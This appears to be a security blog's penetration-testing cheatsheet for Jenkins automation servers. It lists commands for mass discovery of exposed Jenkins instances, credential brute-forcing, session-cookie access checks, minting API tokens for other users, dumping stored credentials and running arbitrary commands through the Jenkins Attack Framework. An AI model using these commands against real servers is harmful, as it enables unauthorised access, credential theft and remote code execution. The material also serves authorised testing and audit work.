---
title: Jenkins Penetration Test Cheatsheet
url: https://www.hackingdream.net/2024/12/jenkins-penetration-test-cheatsheet.html
source: Hacking Dream
date: 2024-12-24
fetch_date: 2025-10-06T19:37:11.367670
---

# Jenkins Penetration Test Cheatsheet

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Jenkins Penetration Test Cheatsheet

[December 23, 2024](https://www.hackingdream.net/2024/12/jenkins-penetration-test-cheatsheet.html "permanent link")

|  |
| --- |
| [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvuKQan2MzcJscoSwATnggdIYYt2iiQ0_KVJaWGfE53YkKL4vW_QpQSRzsBo_yhS0XQSOW3nGKbpNIZHqS4CzAGIgWOZHVEL3RO8UAJtOTfnk7_wctc-rrJlmSZhV5nzdzcegG6sTMPbUnQtTqh3vjgHZaeupj8iy82JyuWPuOV09UKxkophV5HuoX-Mk/s320/Jenkins_Penetration_Testing.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvuKQan2MzcJscoSwATnggdIYYt2iiQ0_KVJaWGfE53YkKL4vW_QpQSRzsBo_yhS0XQSOW3nGKbpNIZHqS4CzAGIgWOZHVEL3RO8UAJtOTfnk7_wctc-rrJlmSZhV5nzdzcegG6sTMPbUnQtTqh3vjgHZaeupj8iy82JyuWPuOV09UKxkophV5HuoX-Mk/s512/Jenkins_Penetration_Testing.jpg) |
| Jenkins Penetration Testing Cheatsheet |

 Jenkins is one of the most widely used open-source automation servers, empowering teams to build, test, and deploy their applications with ease. However, its popularity and critical role in CI/CD pipelines make it a prime target for attackers. Misconfigurations, outdated plugins, and inadequate security measures can open doors to exploitation, potentially compromising entire development environments.

This cheatsheet is designed to serve as a quick reference for penetration testers, security professionals, and DevSecOps practitioners seeking to evaluate the security of Jenkins instances effectively. It covers key attack vectors, misconfigurations, and potential vulnerabilities in Jenkins environments, along with tips for identifying and mitigating risks. Whether you're performing an in-depth penetration test or a quick security audit, this guide will help you navigate Jenkins' intricacies with precision.

```
Setting up Test Environment

sudo wget -O /usr/share/keyrings/jenkins-keyring.asc \
  https://pkg.jenkins.io/debian/jenkins.io-2023.key
echo "deb [signed-by=/usr/share/keyrings/jenkins-keyring.asc]" \
  https://pkg.jenkins.io/debian binary/ | sudo tee \
  /etc/apt/sources.list.d/jenkins.list > /dev/null
sudo apt-get update
sudo apt-get install jenkins

apt install openjdk-11-jdk

#Admin password
cat  /var/lib/jenkins/secrets/initialAdminPassword

#Access the server or use the server ip address
http://127.0.0.1:8080
```

```
Jenkins Scanner

# Used to find Jenkins Instances over the internet/Intranet - Mass Host Discovery
download JenkinsScanner.sh from JenkinsVulnFinder

#start the scan, Accessible Jenkins instances will be saved in a given filename
./JenkinsScanner.sh -i ip_list.txt -p 80,443,8443,8080,8010,8090,8085 -o jenkins_instances.txt

#Download JenkinsVulnFinder.py
wget raw.githubusercontent.com/Bhanunamikaze/JenkinsVulnFinder/refs/heads/main/JenkinsVulnsFinder.py

# Run the scanner with anonymous access:
python JenkinsVulnsFinder.py --url http://172.19.107.32:8080 --nocred

# Run the scanner with credentials:
python JenkinsVulnsFinder.py --url http://172.19.107.32:8080 --cred username:password

# Run the scanner with brute-force enabled:
python JenkinsVulnsFinder.py --url http://172.19.107.32:8080/ --nocred --brute --users users.txt --pass pass.txt

# Run Scanner with Directory/Path Search - Takes wordlist file as input
python JenkinsVulnsFinder.py --url http://172.19.107.32:8080 --nocred --dirb wordlist.txt
python JenkinsVulnsFinder.py --url http://172.19.107.32:8080 --cred --dirb wordlist.txt
```

```
Jenkins Attack Framework

#Installation
git clone git@github.com:Accenture/jenkins-attack-framework.git
cd jenkins-attack-framework
chmod +x jaf
sudo ./jaf --install
./jaf --install

#Check access, if creds are not provided, it tries anonymous access
python jaf.py AccessCheck -s http://172.19.107.32:8080/ -a User:user

#Auth check via Cookie - Append Cookie | Crumb headers as below (crumb is optional sometimes)
#This is useful when only SSO is allowed
python jaf.py AccessCheck -s http://172.19.107.32:8080/ -a "JSESSIONID.b56cceb4=node01gv13h0gw8msto7tpp82pv499.node0|crumb=74366885010b4471c265872d42bcf5767773698bab0b49dc09d48dd8bfa0725e"

# View console output for the last build of every job that the user can see
python jaf.py ConsoleOutput  -s http://172.19.107.32:8080/ -a User:user

#Create API Token, Need privileges
python jaf.py CreateAPIToken  -s http://172.19.107.32:8080/ -a User:user

#Create an API Token on behalf of user `Bhanu`
python jaf.py CreateAPIToken  -s http://172.19.107.32:8080/ -a User:user --User Bhanu

# Dump Creds, require administrative credentials with /script access.
python jaf.py DumpCreds -s http://172.19.107.32:8080/ -a Bhanu:Bhanu

# List API tokens for a given user ;  require administrative credentials with /script access.
python jaf.py ListAPITokens  -s http://172.19.107.32:8080/ -a Bhanu:Bhanu --user User

#List jobs
python jaf.py ListJobs -s http://172.19.107.32:8080/ -a Bhanu:Bhanu --user User

# Run any command, require administrative credentials with /script access.
python jaf.py RunCommand  whoami -s http://172.19.107.32:8080/ -a Bhanu:Bhanu
```

[![](https://img1.blogblog.com/img/icon18_email.gif)](https://draft.blogger.com/email-post/7320167475718896234/4077929674299276267 "Email Post")

[Cheatsheet](https://www.hackingdream.net/search/label/Cheatsheet)

By:

[Bhanu Namikaze](https://draft.blogger.com/profile/11095863747944917885 "author profile")

![](//lh5.googleusercontent.com/-5klQY__bhSE/AAAAAAAAAAI/AAAAAAAAFfc/f8794NZCX3M/s512-c/photo.jpg)

##### Bhanu Namikaze

Bhanu Namikaze is an Ethical Hacker, Security Analyst, Blogger, Web Developer and a Mechanical Engineer. He Enjoys writing articles, Blogging, Debugging Errors and Capture the Flags. Enjoy Learning; There is Nothing Like Absolute Defeat - Try and try until you Succeed.

#### No comments:

#### Post a Comment

## Search for a Post

## Recent Posts

[Recent Posts Widget](http://www.hackingdream.net/2015/12/recent-post-widgets-for-blogger-with-thumbnails.html)
Your browser does not support JavaScript!

## Popular Posts

[Recent Posts Widget](http://www.hackingdream.net/2015/12/recent-post-widgets-for-blogger-with-thumbnails.html)
Your browser does not support JavaScript!

* [facebook](http://www.facebook.com/HackingDream)
* [twitter](http://www.twitter.com/HackingDream)
* [youtube](https://www.youtube.com/channel/UCKgOUVTaT-6LKLvUQhfBhig)

## About us

![about footer](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPNiXyJNB8w-IovFpOQWeftMUoBrVjS1T-fL9Xe9iixFQvIijmZC4TC0j8Y8E384vrStxGn58Etcw-KbG-ISpaK5eL...